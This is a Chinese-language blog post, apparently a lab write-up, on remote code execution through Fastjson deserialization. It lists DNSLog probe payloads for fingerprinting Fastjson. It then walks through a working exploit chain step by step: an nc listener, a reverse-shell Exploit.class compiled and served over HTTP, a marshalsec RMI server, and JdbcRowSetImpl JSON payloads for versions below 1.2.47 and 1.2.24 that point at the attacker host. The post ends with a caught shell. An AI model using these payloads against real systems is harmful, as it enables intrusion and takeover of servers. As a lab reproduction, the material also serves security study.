# Fastjson反序列化




## 简介

fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。可以通过反序列化导致远程命令执行。





## 漏洞检测方法

### DNSLog回显

下面有多个请求，分别放到请求数据包部分(可能某个不适用, 多试几个)，通过构造DNS解析来判断是否是Fastjson，Fastjson在解析下面这些Payload时会取解析val的值，从而可以**在dnslog接收到回显**，**以此判断是不是Fastjson**

```json
{"a":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}

{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"xxx.dnslog.cn"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"xxx.dnslog.cn"}}""}
{{"@type":"java.net.URL","val":"xxx.dnslog.cn"}:"aaa"}
Set[{"@type":"java.net.URL","val":"xxx.dnslog.cn"}]
Set[{"@type":"java.net.URL","val":"xxx.dnslog.cn"}
{{"@type":"java.net.URL","val":"xxx.dnslog.cn"}:0
```



### 增加key

Java语言中常用的Json处理主要是Fastjson和Jackson，相对而言，Jackson比较严格，强制Key和JavaBean属性对齐，只能少Key不能多Key，所以可以通过增加一个Key看响应包会不会报错来判断。



## 利用复现

这里用的docker环境

<img src="http://image.xpshuai.cn/fj1.jpg"></img>



1.查看数据包，可以用上面的`漏洞检测`的方法来判断

<img src="http://image.xpshuai.cn/fj2.jpg"></img>





2.vps用nc监听端口8888

```bash
nc -lvvp 8888
```



EXP地址：https://github.com/CaijiOrz/fastjson-1.2.47-RCE

3.修改exp中反弹shell的服务器地址和为我们的

<img src="http://image.xpshuai.cn/fj3.jpg"></img>



4.使用javac进行编译，然后会生成一个Exploit.class文件

```bash
javac Exploit.java
```

<img src="http://image.xpshuai.cn/fj4.jpg"></img>



5.在Exploit.class的目录下开启python的简单http服务，相当于访问就能下载

```bash
python -m SimpleHTTPServer 8080
```

<img src="http://image.xpshuai.cn/fj5.jpg"></img>

6.执行下面的命令开启RMI/LDAP服务

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.43.102:8080/#Exploit" 9999	#8080是前面SimpleHTTPServer的端口

```

<img src="http://image.xpshuai.cn/fj6.jpg"></img>







7.构造exp请求包

```json
# 1.2.47以下版本
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.43.102:9999/Exploit",
        "autoCommit":true
    }
}







# 1.2.24以下版本
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://同上类文件地址:9999/TouchFile",
        "autoCommit":true
    }
}

```



8.构造好的请求包发送如下，注意：Content-type格式要`json`，并且是`post`请求

```bash
Content-type: application/json
```

<img src="http://image.xpshuai.cn/fj7.jpg"></img>



9.接收到反弹回来的shell

<img src="http://image.xpshuai.cn/fj8.jpg"></img>





参考：https://www.naraku.cn/posts/86.html



---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/  

